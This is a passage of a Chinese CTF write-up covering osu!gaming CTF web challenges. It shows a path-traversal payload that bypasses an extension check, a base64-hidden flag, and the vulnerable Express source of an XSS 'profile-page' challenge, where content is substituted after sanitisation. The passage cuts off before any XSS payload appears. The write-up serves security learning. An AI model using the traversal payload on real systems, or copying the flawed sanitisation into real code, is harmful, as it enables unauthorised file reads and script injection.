function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>) &#123; <span class="comment">// only allow images</span></span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./img/&#x27;</span> + req.<span class="property">query</span>.<span class="property">path</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们的目的是要读取img下的flag.txt，关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p>根据点来分割得到后缀名，那我们只需要用点把”png” 包裹住然后再在后面用 ..&#x2F; 进行目录穿越即可，最后payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image?path=miku1.jpg./../flag.txt</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osu&#123;miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku&#125;</span><br></pre></td></tr></table></figure><h2 id="when-you-dont-see-it-235-solves-111-points"><a href="#when-you-dont-see-it-235-solves-111-points" class="headerlink" title="when-you-dont-see-it(235 solves &#x2F; 111 points)"></a><strong>when-you-dont-see-it</strong>(235 solves &#x2F; 111 points)</h2><p><a href="https://osu.ppy.sh/users/11118671">https://osu.ppy.sh/users/11118671</a></p><p>给了一个osu的<a href="https://osu.ppy.sh/users/11118671">用户界面</a></p><p>右键查看源代码搜索flag，在最后一个flag出找到flag提示(这题解的人少的原因估计是搜索出来有342个flag字样然后懒得看吧&#x3D; &#x3D;)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[color=]the flag is b3N1e29rX3Vfc2VlX21lfQ== encoded with base64</span><br></pre></td></tr></table></figure><p>base64解码一下得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osu&#123;ok_u_see_me&#125;</span><br></pre></td></tr></table></figure><h2 id="profile-page-190-solves-114-points"><a href="#profile-page-190-solves-114-points" class="headerlink" title="profile-page(190 solves &#x2F; 114 points)"></a><strong>profile-page</strong>(190 solves &#x2F; 114 points)</h2><p><a href="https://profile-page.web.osugaming.lol/login">https://profile-page.web.osugaming.lol/login</a></p><p><a href="https://adminbot.web.osugaming.lol/profile-page">https://adminbot.web.osugaming.lol/profile-page</a></p><p>给了两个网页，一个<a href="https://profile-page.web.osugaming.lol/login">用户登录注册页面</a>，一个检查<a href="https://adminbot.web.osugaming.lol/profile-page">访问页面</a>并且给了题目<a href="./profile-page.zip">附件</a></p><p>先简单看一下两个页面实现了什么再进行代码审计</p><p>首先是登录注册的注册好之后会直接登录，登录进去的用户界面是一个仿osu官网的用户界面</p><p>然后是检查访问界面</p><p>输入你用户的url会有一个机器人访问你的用户界面</p><p>有机器人进行页面访问，那猜测大概率是xss题了</p><p>ok，接下来我们看题目的源码先看app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> expressSession <span class="keyword">from</span> <span class="string">&quot;express-session&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> cookieParser <span class="keyword">from</span> <span class="string">&quot;cookie-parser&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> crypto <span class="keyword">from</span> <span class="string">&quot;crypto&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">JSDOM</span> &#125; <span class="keyword">from</span> <span class="string">&quot;jsdom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&quot;dompurify&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">2727</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">expressSession</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;public&quot;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;hbs&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; users.<span class="title function_">has</span>(req.<span class="property">session</span>.<span class="property">user</span>)) &#123;</span><br><span class="line">        req.<span class="property">user</span> = users.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">user</span>);</span><br><span class="line">        res.<span class="property">locals</span>.<span class="property">user</span> = req.<span class="property">user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">window</span> = <span class="keyword">new</span> <span class="title function_">JSDOM</span>(<span class="string">&#x27;&#x27;</span>).<span class="property">window</span>;</span><br><span class="line"><span class="keyword">const</span> purify = <span class="title class_">DOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">renderBBCode</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[b\](.+?)\[\/b\]/g</span>, <span class="string">&#x27;&lt;strong&gt;$1&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[i\](.+?)\[\/i\]/g</span>, <span class="string">&#x27;&lt;i&gt;$1&lt;/i&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[u\](.+?)\[\/u\]/g</span>, <span class="string">&#x27;&lt;u&gt;$1&lt;/u&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[strike\](.+?)\[\/strike\]/g</span>, <span class="string">&#x27;&lt;strike&gt;$1&lt;/strike&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[color=#([0-9a-f]&#123;6&#125;)\](.+?)\[\/color\]/g</span>, <span class="string">&#x27;&lt;span style=&quot;color: #$1&quot;&gt;$2&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[size=(\d+)\](.+?)\[\/size\]/g</span>, <span class="string">&#x27;&lt;span style=&quot;font-size: $1px&quot;&gt;$2&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[url=(.+?)\](.+?)\[\/url\]/g</span>, <span class="string">&#x27;&lt;a href=&quot;$1&quot;&gt;$2&lt;/a&gt;&#x27;</span>);</span><br><span class="line">    data = data.<span class="title function_">replaceAll</span>(<span class="regexp">/\[img\](.+?)\[\/img\]/g</span>, <span class="string">&#x27;&lt;img src=&quot;$1&quot; /&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">renderBio</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderBBCode</span>(data);</span><br><span class="line">    <span class="keyword">const</span> sanitized = purify.<span class="title function_">sanitize</span>(html);</span><br><span class="line">    <span class="comment">// do this after sanitization because otherwise iframe will be removed</span></span><br><span class="line">    <span class="keyword">return</span> sanitized.<span class="title function_">replaceAll</span>(</span><br><span class="line">        <span class="regexp">/\[youtube\](.+?)\[\/youtube\]/g</span>,</span><br><span class="line">        <span class="string">&#x27;&lt;iframe sandbox=&quot;allow-scripts&quot; width=&quot;640px&quot; height=&quot;480px&quot; src=&quot;https://www.youtube.com/embed/$1&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;&#x27;</span></span><br><span class="line">    );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sha256</span> = (<span class="params">data</span>) =&gt; crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(data).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">requiresLogin</span> = (<span class="params">req, res, next</span>) =&gt; req.<span class="property">user</span> ? <span class="title function_">next</span>() : res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!username || <span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || !password || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span> || password.<span class="property">length</span> &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;username or password too short&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &gt; <span class="number">30</span> || <span class="regexp">/[^A-Za-z0-9 ]/</span>.<span class="title function_">test</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid username format&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;a user already exists with that username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users.<span class="title function_">set</span>(username, &#123;</span><br><span class="line">        username,</span><br><span class="line">        <span class="attr">password</span>: <span class="title function_">sha256</span>(password),</span><br><span class="line">        <span class="attr">bio</span>: <span class="title function_">renderBio</span>(<span class="string">`Welcome to <span class="subst">$&#123;username&#125;</span>&#x27;s page!`</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = username;</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&quot;csrf&quot;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile/&quot;</span> + username);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!username || <span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || !password || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;no user exists with that username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">get</span>(username).<span class="property">password</span> !== <span class="title function_">sha256</span>(password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = username;</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&quot;csrf&quot;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile/&quot;</span> + username);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> update bio from UI</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/update&quot;</span>, requiresLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; bio &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bio || <span class="keyword">typeof</span> bio !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing bio&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">headers</span>.<span class="property">csrf</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing csrf token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">headers</span>.<span class="property">csrf</span> !== req.<span class="property">cookies</span>.<span class="property">csrf</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid csrf token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bio.<span class="property">length</span> &gt; <span class="number">2048</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;bio too long&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span>.<span class="property">bio</span> = <span class="title function_">renderBio</span>(bio);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`Bio updated!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&quot;register&quot;</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/profile&quot;</span>, requiresLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile/&quot;</span> + req.<span class="property">user</span>.<span class="property">username</span>));</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/profile/:user&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; user &#125; = req.<span class="property">params</span>;</span><br><span class="line">    <span class="keyword">if</span> (!users.<span class="title function_">has</span>(user)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;no user exists with that username!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">user</span> = users.<span class="title function_">get</span>(user);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;profile&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">    res.<span class="property">status</span> = <span class="number">404</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`Error: <span class="subst">$&#123;req.originalUrl&#125;</span> was not found`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`web/profile-page listening at http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>));</span><br></pre></td></tr></table></figure><p>这个是登录注册的源码，里面有三个api路由和一个用户界面，每个路由进行分析</p><p>(虽然一眼看过去就知道是上面<code>data.replaceAll</code>有问题，但是因为代码审计能力太弱了，完全没有看见，导致做了将近两个小时，还是通过一点点非预期才看见的，谢罪了)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!username || <span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || !password || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span> || password.<span class="property">length</span> &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;username or password too short&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &gt; <span class="number">30</span> || <span class="regexp">/[^A-Za-z0-9 ]/</span>.<span class="title function_">test</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid username format&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;a user already exists with that username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users.<span class="title function_">set</span>(username, &#123;</span><br><span class="line">        username,</span><br><span class="line">        <span class="attr">password</span>: <span class="title function_">sha256</span>(password),</span><br><span class="line">        <span class="attr">bio</span>: <span class="title function_">renderBio</span>(<span class="string">`Welcome to <span class="subst">$&#123;username&#125;</span>&#x27;s page!`</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = username;</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&quot;csrf&quot;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile/&quot;</span> + username);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>注册的api限制了用户名长度(5,30)，且只能有数字字母，且用户名不能和别人重复，密码长度大于8，并且将用户名解析在bio中(没有xss的经验让我找了快半小时only数字字母xss的技巧无果才看其他地方的)</p><p>然后是登录</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!username || <span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || !password || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;no user exists with that username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">get</span>(username).<span class="property">password</span> !== <span class="title function_">sha256</span>(password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;invalid password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = username;</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&quot;csrf&quot;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>));</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/profile/&quot;</span> + username);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>就是检测map中值对应是否正确，没有想到可以利用的地方</p><p>最后是关键的<code>/api/update</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> update bio from UI</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/update&quot;</span>, requiresLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; bio &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bio || <span class="keyword">typeof</span> bio !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing bio&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">headers</span>.<span class="property">csrf</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;missing csrf 